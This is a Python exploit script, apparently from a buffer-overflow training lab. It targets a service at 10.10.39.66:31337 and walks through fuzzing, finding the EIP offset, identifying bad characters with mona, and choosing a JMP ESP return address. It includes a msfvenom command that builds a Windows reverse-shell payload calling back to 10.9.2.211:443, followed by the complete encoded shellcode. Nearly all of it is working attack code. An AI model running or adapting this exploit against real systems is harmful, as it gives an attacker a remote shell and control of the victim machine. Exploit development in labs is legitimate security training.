import buff
import custom


target = ("10.10.39.66", 31337)
runner = buff.Buff(target = target, prefix = "", postfix = "\n")



"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 200
runner.setFuzzer(custom.fuzz) # custom fuzzer
# runner.fuzz(sleep = 3)



# ----- 2. Send Unique Characters -----
# Set Buffer Size
BUFFER_SIZE = 600
runner.setBufferSize(BUFFER_SIZE)

# runner.sendPattern()



# ----- 3. Find EIP Offset -----
"""
!mona findmsp -distance 600
"""
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "386F4337")
# print(offset)

# Set Eip offset
EIP_OFFSET = 146
runner.setEipOffset(EIP_OFFSET)



# ----- 4. Find Bad Characters -----
"""
Possible: 23 24 3c 3d 83 84 ba

!mona bytearray -b "\x00\x0a"
!mona compare -f C:\mona\dostackbufferoverflowgood\bytearray.bin -a 016819F8
"""
# runner.sendBadChars(exclude = ["\x0a"])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\x00"

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00\x0a" -a x86 -f c
"""

# Set return address (in reverse)
eip_address = "\xc3\x14\x04\x08"
runner.setEipAddress(eip_address)

exploit = (
    "\xda\xde\xd9\x74\x24\xf4\xbf\x89\xe2\x5a\xfd\x5a\x29\xc9\xb1"
    "\x52\x31\x7a\x17\x03\x7a\x17\x83\x63\x1e\xb8\x08\x8f\x37\xbf"
    "\xf3\x6f\xc8\xa0\x7a\x8a\xf9\xe0\x19\xdf\xaa\xd0\x6a\x8d\x46"
    "\x9a\x3f\x25\xdc\xee\x97\x4a\x55\x44\xce\x65\x66\xf5\x32\xe4"
    "\xe4\x04\x67\xc6\xd5\xc6\x7a\x07\x11\x3a\x76\x55\xca\x30\x25"
    "\x49\x7f\x0c\xf6\xe2\x33\x80\x7e\x17\x83\xa3\xaf\x86\x9f\xfd"
    "\x6f\x29\x73\x76\x26\x31\x90\xb3\xf0\xca\x62\x4f\x03\x1a\xbb"
    "\xb0\xa8\x63\x73\x43\xb0\xa4\xb4\xbc\xc7\xdc\xc6\x41\xd0\x1b"
    "\xb4\x9d\x55\xbf\x1e\x55\xcd\x1b\x9e\xba\x88\xe8\xac\x77\xde"
    "\xb6\xb0\x86\x33\xcd\xcd\x03\xb2\x01\x44\x57\x91\x85\x0c\x03"
    "\xb8\x9c\xe8\xe2\xc5\xfe\x52\x5a\x60\x75\x7e\x8f\x19\xd4\x17"
    "\x7c\x10\xe6\xe7\xea\x23\x95\xd5\xb5\x9f\x31\x56\x3d\x06\xc6"
    "\x99\x14\xfe\x58\x64\x97\xff\x71\xa3\xc3\xaf\xe9\x02\x6c\x24"
    "\xe9\xab\xb9\xeb\xb9\x03\x12\x4c\x69\xe4\xc2\x24\x63\xeb\x3d"
    "\x54\x8c\x21\x56\xff\x77\xa2\x53\x09\x75\xe1\x0c\x0b\x79\x04"
    "\x76\x82\x9f\x6c\x98\xc3\x08\x19\x01\x4e\xc2\xb8\xce\x44\xaf"
    "\xfb\x45\x6b\x50\xb5\xad\x06\x42\x22\x5e\x5d\x38\xe5\x61\x4b"
    "\x54\x69\xf3\x10\xa4\xe4\xe8\x8e\xf3\xa1\xdf\xc6\x91\x5f\x79"
    "\x71\x87\x9d\x1f\xba\x03\x7a\xdc\x45\x8a\x0f\x58\x62\x9c\xc9"
    "\x61\x2e\xc8\x85\x37\xf8\xa6\x63\xee\x4a\x10\x3a\x5d\x05\xf4"
    "\xbb\xad\x96\x82\xc3\xfb\x60\x6a\x75\x52\x35\x95\xba\x32\xb1"
    "\xee\xa6\xa2\x3e\x25\x63\xc2\xdc\xef\x9e\x6b\x79\x7a\x23\xf6"
    "\x7a\x51\x60\x0f\xf9\x53\x19\xf4\xe1\x16\x1c\xb0\xa5\xcb\x6c"
    "\xa9\x43\xeb\xc3\xca\x41"
)
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

# runner.sendExploit()
